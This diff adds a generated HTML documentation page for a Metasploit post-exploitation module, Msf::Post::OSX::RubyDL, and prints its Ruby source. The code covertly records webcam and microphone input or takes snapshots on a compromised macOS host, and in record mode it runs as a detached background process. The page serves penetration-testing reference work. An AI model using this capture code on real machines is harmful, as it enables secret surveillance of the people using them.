@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Post::OSX::RubyDL
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Post::OSX::RubyDL";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (R)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Post.html" title="Msf::Post (class)">Post</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../OSX.html" title="Msf::Post::OSX (module)">OSX</a></span></span>
+     &raquo; 
+    <span class="title">RubyDL</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Post::OSX::RubyDL
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/post/osx/ruby_dl.rb</dd>
+  </dl>
+  
+</div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#osx_capture_media-instance_method" title="#osx_capture_media (instance method)">#<strong>osx_capture_media</strong>(opts)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#osx_ruby_dl_header-instance_method" title="#osx_ruby_dl_header (instance method)">#<strong>osx_ruby_dl_header</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="osx_capture_media-instance_method">
+  
+    #<strong>osx_capture_media</strong>(opts)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356
+357
+358
+359
+360
+361
+362
+363
+364
+365
+366
+367
+368
+369
+370
+371
+372
+373
+374
+375
+376
+377
+378</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/osx/ruby_dl.rb', line 47</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_osx_capture_media'>osx_capture_media</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_capture_code'>capture_code</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='embexpr_beg'>#{</span><span class='id identifier rubyid_osx_ruby_dl_header'>osx_ruby_dl_header</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+
+options = {
+:action =&gt; &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_action'>action</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;, # or list|snapshot|record
+:snap_filetype =&gt; &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_snap_filetype'>snap_filetype</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;, # jpg|png|gif|tiff|bmp
+:audio_enabled =&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_audio_enabled'>audio_enabled</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>,
+:video_enabled =&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_video_enabled'>video_enabled</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>,
+:num_chunks =&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_num_chunks'>num_chunks</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>, # wachawa!
+:chunk_len =&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_chunk_len'>chunk_len</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>, # save chunks every 5 seconds
+:video_device =&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_video_device'>video_device</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>, # automatic
+:audio_device =&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_audio_device'>audio_device</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>,
+:snap_jpg_compression =&gt; </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_snap_jpg_compression'>snap_jpg_compression</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>, # compression ratio (between 0 &amp; 1), JPG ONLY
+:video_compression =&gt; &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_video_compression'>video_compression</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;,
+:audio_compression =&gt; &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_audio_compression'>audio_compression</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;,
+:record_file =&gt; &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_record_file'>record_file</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;,
+:snap_file =&gt; &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbeg'>:</span><span class='id identifier rubyid_snap_file'>snap_file</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;
+}
+
+RUN_LOOP_STEP = 0.1 # &quot;tick&quot; duration for spinning NSRunLoop
+
+# NSTIFFFileType  0 
+# NSBMPFileType   1
+# NSGIFFileType   2
+# NSJPEGFileType  3
+# NSPNGFileType   4 
+SNAP_FILETYPES = %w(tiff bmp gif jpg png)
+
+snap_filetype_index = SNAP_FILETYPES.index(options[:snap_filetype].to_s)
+
+require &#39;fileutils&#39;
+FileUtils.mkdir_p File.dirname(options[:record_file])
+FileUtils.mkdir_p File.dirname(options[:snap_file])
+
+#### Helper methods for objc message passing
+
+if not ruby_1_9_or_higher?
+# ruby &lt; 1.9 freaks when you send int -&gt; void* or flout -&gt; void*
+#  so we have to reload the lib into separate modules with different
+#  exported typedefs, and patch objc_call to do our own typechecking.
+# this can probably be done better.
+module LibCWithInt
+  extend Importer
+  dlload &#39;libSystem.B.dylib&#39;
+  extern &#39;void *sel_getUid(void*)&#39;
+  extern &#39;void *objc_msgSend(void *, void *, int, int)&#39;
+end
+module LibCWithFloat
+  extend Importer
+  dlload &#39;libSystem.B.dylib&#39;
+  extern &#39;void *sel_getUid(void*)&#39;
+  extern &#39;void *objc_msgSend(void *, void *, double, double)&#39;
+end
+module LibCWithVoidPtrInt
+  extend Importer
+  dlload &#39;libSystem.B.dylib&#39;
+  extern &#39;void *sel_getUid(void*)&#39;
+  extern &#39;void *objc_msgSend(void *, void *, void*, int)&#39;
+end
+module LibCWithIntVoidPtr
+  extend Importer
+  dlload &#39;libSystem.B.dylib&#39;
+  extern &#39;void *sel_getUid(void*)&#39;
+  extern &#39;void *objc_msgSend(void *, void *, int, void*)&#39;
+end
+end
+
+
+def objc_call(instance, method, arg=nil, arg2=nil)
+# ruby &lt; 1.9 freaks when you send int -&gt; void* or flout -&gt; void*
+# so we have to reload the lib into a separate with different exported typedefs,
+#  and call
+if not ruby_1_9_or_higher? and arg.kind_of?(Integer)
+  if not arg2.kind_of?(Integer) and not arg2.nil?
+    LibCWithIntVoidPtr.objc_msgSend(instance, LibCWithIntVoidPtr.sel_getUid(method), arg||0, arg2)
+  else
+    LibCWithInt.objc_msgSend(instance, LibCWithInt.sel_getUid(method), arg||0, arg2||0)
+  end
+elsif not ruby_1_9_or_higher? and arg2.kind_of?(Integer)
+  LibCWithVoidPtrInt.objc_msgSend(instance, LibCWithVoidPtrInt.sel_getUid(method), arg||0, arg2)
+elsif not ruby_1_9_or_higher? and arg.kind_of?(Float)
+  LibCWithFloat.objc_msgSend(instance, LibCWithFloat.sel_getUid(method), arg||0.0, arg2||0.0)
+else
+  QTKit.objc_msgSend(instance, QTKit.sel_getUid(method), arg, arg2)
+end
+end
+
+def objc_call_class(klass, method, arg=nil, arg2=nil)
+objc_call(QTKit.objc_getClass(klass), QTKit.sel_getUid(method), arg, arg2)
+end
+
+def nsstring(str)
+objc_call(objc_call(objc_call_class(
+  &#39;NSString&#39;, &#39;alloc&#39;),
+  &#39;initWithCString:&#39;, str), 
+  &#39;autorelease&#39;)
+end
+
+
+#### External dynamically linked code
+
+VID_TYPE = &#39;vide&#39;
+MUX_TYPE = &#39;muxx&#39;
+AUD_TYPE = &#39;soun&#39;
+
+module QTKit
+extend Importer
+dlload &#39;QTKit.framework/QTKit&#39;
+extern &#39;void *objc_msgSend(void *, void *, void *, void*)&#39;
+extern &#39;void *sel_getUid(void*)&#39;
+extern &#39;void *objc_getClass(void *)&#39;
+end
+
+#### Actual Webcam code
+autorelease_pool = objc_call_class(&#39;NSAutoreleasePool&#39;, &#39;new&#39;)
+
+vid_type = nsstring(VID_TYPE)
+mux_type = nsstring(MUX_TYPE)
+aud_type = nsstring(AUD_TYPE)
+
+devices_ref = objc_call_class(&#39;QTCaptureDevice&#39;, &#39;inputDevices&#39;)
+device_count = objc_call(devices_ref, &#39;count&#39;).to_i
+if device_count.zero? and not options[:actions] =~ /list/i
+raise &quot;Invalid device. Check devices with `set ACTION LIST`. Exiting.&quot;
+exit
+end
+
+device_enum = objc_call(devices_ref, &#39;objectEnumerator&#39;)
+devices = (0...device_count).
+map { objc_call(device_enum, &#39;nextObject&#39;) }.
+select do |device|
+  vid = objc_call(device, &#39;hasMediaType:&#39;, vid_type).to_i &gt; 0
+  mux = objc_call(device, &#39;hasMediaType:&#39;, mux_type).to_i &gt; 0
+  vid or mux
+end
+
+device_enum = objc_call(devices_ref, &#39;objectEnumerator&#39;)
+audio_devices = (0...device_count).
+map { objc_call(device_enum, &#39;nextObject&#39;) }.
+select { |d| objc_call(d, &#39;hasMediaType:&#39;, aud_type).to_i &gt; 0 }
+
+def device_names(devices)
+devices.
+  map { |device| objc_call(device, &#39;localizedDisplayName&#39;) }.
+  map { |name| objc_call(name, &#39;UTF8String&#39;) }.
+  map(&amp;:to_s)
+end
+
+def device_stati(devices)
+devices.
+  map { |d| objc_call(d, &#39;isInUseByAnotherApplication&#39;).to_i &gt; 0 }.
+  map { |b| if b then &#39;BUSY&#39; else &#39;AVAIL&#39; end }
+end
+
+def print_devices(devices)
+device_names(devices).zip(device_stati(devices)).each_with_index do |d, i|
+  puts &quot;\#{i}.  \#{d[0]} [\#{d[1]}]&quot;
+end
+end
+
+def print_compressions(type)
+compressions = objc_call_class(&#39;QTCompressionOptions&#39;,
+  &#39;compressionOptionsIdentifiersForMediaType:&#39;, type)
+count = objc_call(compressions, &#39;count&#39;).to_i
+if count.zero?
+  puts &quot;No supported compression types found.&quot;
+else
+  comp_enum = objc_call(compressions, &#39;objectEnumerator&#39;)
+  puts((0...count).
+    map { objc_call(comp_enum, &#39;nextObject&#39;) }.
+    map { |c| objc_call(c, &#39;UTF8String&#39;).to_s }.
+    join(&quot;\n&quot;)
+  )
+end
+end
+
+def use_audio?(options)
+options[:audio_enabled] and options[:action].to_s == &#39;record&#39;
+end
+
+def use_video?(options)
+(options[:video_enabled] and options[:action].to_s == &#39;record&#39;) or options[:action].to_s == &#39;snapshot&#39;
+end
+
+if options[:action].to_s == &#39;list&#39;
+if options[:video_enabled]
+  puts &quot;===============\nVideo Devices:\n===============\n&quot;
+  print_devices(devices)
+  puts &quot;\nAvailable video compression types:\n\n&quot;
+  print_compressions(vid_type)
+end
+puts &quot;\n===============\nAudio Devices:\n===============\n&quot;
+print_devices(audio_devices)
+puts &quot;\nAvailable audio compression types:\n\n&quot;
+print_compressions(aud_type)
+exit
+end
+
+# Create a session to add I/O to
+session = objc_call_class(&#39;QTCaptureSession&#39;, &#39;new&#39;)
+
+# open the AV devices
+if use_video?(options)
+video_device = devices[options[:video_device]]
+if not objc_call(video_device, &#39;open:&#39;, nil).to_i &gt; 0
+  raise &#39;Failed to open video device&#39;
+end
+input = objc_call_class(&#39;QTCaptureDeviceInput&#39;, &#39;alloc&#39;)
+input = objc_call(input, &#39;initWithDevice:&#39;, video_device)
+objc_call(session, &#39;addInput:error:&#39;, input, nil)
+end
+
+if use_audio?(options)
+# open the audio device
+audio_device = audio_devices[options[:audio_device]]
+if not objc_call(audio_device, &#39;open:&#39;, nil).to_i &gt; 0
+  raise &#39;Failed to open audio device&#39;
+end
+input = objc_call_class(&#39;QTCaptureDeviceInput&#39;, &#39;alloc&#39;)
+input = objc_call(input, &#39;initWithDevice:&#39;, audio_device)
+objc_call(session, &#39;addInput:error:&#39;, input, nil)
+end
+
+# initialize file output
+record_file = options[:record_file]
+output = objc_call_class(&#39;QTCaptureMovieFileOutput&#39;, &#39;new&#39;)
+file_url = objc_call_class(&#39;NSURL&#39;, &#39;fileURLWithPath:&#39;, nsstring(record_file))
+objc_call(output, &#39;recordToOutputFileURL:&#39;, file_url)
+objc_call(session, &#39;addOutput:error:&#39;, output, nil)
+
+# set up video/audio compression options
+connection = nil
+connection_enum = objc_call(objc_call(output, &#39;connections&#39;), &#39;objectEnumerator&#39;)
+
+while (connection = objc_call(connection_enum, &#39;nextObject&#39;)).to_i &gt; 0
+media_type = objc_call(connection, &#39;mediaType&#39;)
+
+compress_opts = if objc_call(media_type, &#39;isEqualToString:&#39;, vid_type).to_i &gt; 0 ||
+                   objc_call(media_type, &#39;isEqualToString:&#39;, mux_type).to_i &gt; 0 
+  objc_call_class(&#39;QTCompressionOptions&#39;, &#39;compressionOptionsWithIdentifier:&#39;, 
+    nsstring(options[:video_compression]))
+elsif use_audio?(options) and objc_call(media_type, &#39;isEqualToString:&#39;, aud_type).to_i &gt; 0
+  objc_call_class(&#39;QTCompressionOptions&#39;, &#39;compressionOptionsWithIdentifier:&#39;, 
+    nsstring(options[:audio_compression]))
+end
+
+unless compress_opts.to_i.zero?
+  objc_call(output, &#39;setCompressionOptions:forConnection:&#39;, compress_opts, connection)
+end
+end
+
+# start capturing from the webcam
+objc_call(session, &#39;startRunning&#39;)
+
+# we use NSRunLoop, which allows QTKit to spin its thread? somehow it is needed.
+run_loop = objc_call_class(&#39;NSRunLoop&#39;, &#39;currentRunLoop&#39;)
+
+# wait until at least one frame has been captured
+while objc_call(output, &#39;recordedFileSize&#39;).to_i &lt; 1
+time = objc_call(objc_call_class(&#39;NSDate&#39;, &#39;new&#39;), &#39;autorelease&#39;)
+objc_call(run_loop, &#39;runUntilDate:&#39;, objc_call(time, &#39;dateByAddingTimeInterval:&#39;, RUN_LOOP_STEP))
+end
+
+if options[:action] == &#39;record&#39; # record in a loop for options[:record_len] seconds
+curr_chunk = 0
+last_roll = Time.now
+# wait until at least one frame has been captured
+while curr_chunk &lt; options[:num_chunks]
+  time = objc_call(objc_call_class(&#39;NSDate&#39;, &#39;new&#39;), &#39;autorelease&#39;)
+  objc_call(run_loop, &#39;runUntilDate:&#39;, objc_call(time, &#39;dateByAddingTimeInterval:&#39;, RUN_LOOP_STEP))
+
+  if Time.now - last_roll &gt; options[:chunk_len].to_i # roll that movie file
+    base = File.basename(record_file, &#39;.*&#39;) # returns it with no extension
+    num = ((base.match(/\\d+$/)||[&#39;0&#39;])[0].to_i+1).to_s
+    ext = File.extname(record_file) || &#39;o&#39;
+    record_file = File.join(File.dirname(record_file), base+num+&#39;.&#39;+ext)
+
+    # redirect buffer output to new file path
+    file_url = objc_call_class(&#39;NSURL&#39;, &#39;fileURLWithPath:&#39;, nsstring(record_file))
+    objc_call(output, &#39;recordToOutputFileURL:&#39;, file_url)
+    # remember we hit a chunk
+    last_roll = Time.now
+    curr_chunk += 1
+  end
+end
+end
+
+# stop recording and stop session
+objc_call(output, &#39;recordToOutputFileURL:&#39;, nil)
+objc_call(session, &#39;stopRunning&#39;)
+
+# give QTKit some time to write to file
+objc_call(run_loop, &#39;runUntilDate:&#39;, objc_call(time, &#39;dateByAddingTimeInterval:&#39;, RUN_LOOP_STEP))
+
+if options[:action] == &#39;snapshot&#39; # user wants a snapshot
+# read captured movie file into QTKit
+dict = objc_call_class(&#39;NSMutableDictionary&#39;, &#39;dictionary&#39;)
+objc_call(dict, &#39;setObject:forKey:&#39;, nsstring(&#39;NSImage&#39;), nsstring(&#39;QTMovieFrameImageType&#39;))
+# grab a frame image from the move
+m = objc_call_class(&#39;QTMovie&#39;, &#39;movieWithFile:error:&#39;, nsstring(options[:record_file]), nil)
+img = objc_call(m, &#39;currentFrameImage&#39;)
+# set compression options
+opts = objc_call_class(&#39;NSDictionary&#39;, &#39;dictionaryWithObject:forKey:&#39;,
+  objc_call_class(&#39;NSNumber&#39;, &#39;numberWithFloat:&#39;, options[:snap_jpg_compression]),
+  nsstring(&#39;NSImageCompressionFactor&#39;)
+)
+# convert to desired format
+bitmap = objc_call(objc_call(img, &#39;representations&#39;), &#39;objectAtIndex:&#39;, 0)
+data = objc_call(bitmap, &#39;representationUsingType:properties:&#39;, snap_filetype_index, opts)
+objc_call(data, &#39;writeToFile:atomically:&#39;, nsstring(options[:snap_file]), 0)
+
+objc_call(run_loop, &#39;runUntilDate:&#39;, objc_call(time, &#39;dateByAddingTimeInterval:&#39;, RUN_LOOP_STEP))
+
+# # delete the original movie file
+File.delete(options[:record_file])
+end
+
+objc_call(autorelease_pool, &#39;drain&#39;)
+
+</span><span class='heredoc_end'>EOS
+</span>  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:action</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>record</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_capture_code'>capture_code</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q|</span><span class='tstring_content'>
+      cpid = fork do
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_capture_code'>capture_code</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      end
+      Process.detach(cpid)
+      puts cpid
+</span><span class='tstring_end'>|</span></span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_capture_code'>capture_code</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="osx_ruby_dl_header-instance_method">
+  
+    #<strong>osx_ruby_dl_header</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/osx/ruby_dl.rb', line 6</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_osx_ruby_dl_header'>osx_ruby_dl_header</span>
+  <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>require &#39;dl&#39;
+require &#39;dl/import&#39;
+
+#### Patches to DL (for compatibility between 1.8-&gt;1.9)
+
+Importer = if defined?(DL::Importer) then DL::Importer else DL::Importable end
+
+def ruby_1_9_or_higher?
+  RUBY_VERSION.to_f &gt;= 1.9
+end
+
+def malloc(size)
+  if defined?(DL::CPtr)
+    DL::CPtr.malloc(size)
+  else
+    DL::malloc(size)
+  end
+end
+
+# the old Ruby Importer defaults methods to downcase every import
+# This is annoying, so we&#39;ll patch with method_missing
+if not ruby_1_9_or_higher?
+  module DL
+    module Importable
+      def method_missing(meth, *args, &amp;block)
+        str = meth.to_s
+        lower = str[0,1].downcase + str[1..-1]
+        if self.respond_to?(lower, true)
+          self.send lower, *args
+        else
+          super
+        end
+      end
+    end
+  end
+end
+</span><span class='heredoc_end'>EOS
+</span><span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:30:28 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
